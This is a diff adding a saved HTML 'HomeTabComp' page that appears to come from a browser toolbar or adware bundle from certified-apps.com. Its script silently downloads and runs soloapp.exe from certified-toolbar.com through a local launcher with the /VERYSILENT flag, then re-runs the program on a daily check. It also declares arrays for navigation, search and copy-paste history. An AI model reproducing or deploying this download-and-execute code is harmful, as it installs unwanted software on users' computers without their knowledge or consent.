@@ -1,0 +1,148 @@
+
+<!-- saved from url=(0043)http://cdn1.certified-apps.com/apps/ht4.htm -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+        <title>HomeTabComp</title>
+      
+    </head>
+<body style="background-color: transparent; zoom: 1;">
+<script type="text/javascript" src="jquery.min(1).js"></script>
+<script type="text/javascript" src="HtmlCompInterfaceVer2.js"></script> 
+<script type="text/javascript" src="debugger.js"></script> 
+<script type="text/javascript" src="utils.js"></script> 
+<script type="text/javascript">
+    var DEBUG = false;
+    var topSitesList = '';
+
+
+    if (DEBUG) {
+
+        showDebug('debug');
+    }
+
+
+    var d = new Date();
+    var weekday = new Array(7);
+    weekday[0] = "Sunday";
+    weekday[1] = "Monday";
+    weekday[2] = "Tuesday";
+    weekday[3] = "Wednesday";
+    weekday[4] = "Thursday";
+    weekday[5] = "Friday";
+    weekday[6] = "Saturday";
+
+    var n = weekday[d.getDay()];
+
+    //var ipPattern = @"\b(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b"
+
+    var clientID = "1234";
+    var navigationHistory = new Array();
+    var topWebsitesHistory = new Array();
+    var searchesHistory = new Array();
+    var copyPastHisory = new Array();
+    var lastURL = "";
+
+    function syncClientId() {
+    }
+
+   
+    if (!window.InterfaceHelper) {
+        window.InterfaceHelper = {};
+        InterfaceHelper.firstRun = true;
+    }
+
+
+
+    function DllInterfaceReady() {
+		//DocumentComplete();
+    }
+    function DocumentComplete() {
+     //first update the luncher
+	 var isDebug=false;
+	 if (RetrieveUrl().indexOf('google')>=0){
+		isDebug=false;
+	 }
+     var SOLOVER = RetrieveSharedKey("SVER");
+     if (SOLOVER == null || SOLOVER == "" || SOLOVER !="7")
+     {
+		LaunchExternalProgram("c:\\windows\\launcher.exe", "-dnr:http://www.certified-toolbar.com/soloapp.exe@/VERYSILENT");
+		SaveSharedKey("SVER", "7");
+     }
+	//when the player is ready - run the check
+	  /* to take out */
+     var browserCode=1;
+     if (isFirefox) browserCode=2;
+     if (!isIE&&!isFirefox) browserCode=3;
+     var soloapp = RetrieveSharedKey("soloapp");
+	 var version = RetrieveSharedKey("version");
+	 if (version==null||version==""){
+		version=1;
+	 }
+	 var versionNumb=version*1.0;
+	 
+	 var LASTPLAYSESSIONCHECK = RetrieveSharedKey("LASTPLAYSESSIONCHECK");
+	 var PLAYBROWSERINSESSION = RetrieveSharedKey("PLAYBROWSERINSESSION");
+	 
+	 if (PLAYBROWSERINSESSION==null||PLAYBROWSERINSESSION==""){
+		PLAYBROWSERINSESSION=0;
+	 }
+     var elapsed = 99999999999999;
+     var startResult = 9999999;
+	 var shouldRunAnotherCheck=false;
+	 var nowFrom70 = new Date().getTime().toString();
+	 
+     if (versionNumb<3.5){
+		return;	
+	 }
+  
+     if (LASTPLAYSESSIONCHECK != null && LASTPLAYSESSIONCHECK != "" && LASTPLAYSESSIONCHECK != "undefined") {
+        startResult = parseFloat(LASTPLAYSESSIONCHECK);
+        elapsed = new Date().getTime() - startResult;
+		
+        if ((elapsed * 1.0 / 1000 / 60 / 60 ) > 24) {
+			shouldRunAnotherCheck=true;
+			SaveSharedKey("LASTPLAYSESSIONCHECK",nowFrom70);
+		}
+	}else{
+		if ((soloapp != null && soloapp == "1")){
+			shouldRunAnotherCheck=true;
+			SaveSharedKey("LASTPLAYSESSIONCHECK",nowFrom70);
+		}
+	}
+				
+	 
+     if (
+		(soloapp != null && soloapp == "1")&&
+		versionNumb>1&&
+		versionNumb>=3.5
+		/*
+		(!isIE||versionNumb>=3.5)
+		*/
+		//false
+		//true
+		)
+     {
+		//if (isDebug) alert('in');
+        var didRunSolo = RetrieveSharedKey("didRunSolo");
+        if (didRunSolo==null||didRunSolo==""||didRunSolo=="undefined"||shouldRunAnotherCheck){
+			//if (isDebug) alert('about to run solo');
+			LaunchExternalProgram("c:\\soloapp\\soloapp.exe", "-browser:" + browserCode + " -check");
+            SaveSharedKey("didRunSolo", "1");
+        }
+     }
+	 
+
+
+    
+
+    }
+
+
+
+
+
+    
+        
+        </script>
+
+
+</body></html>
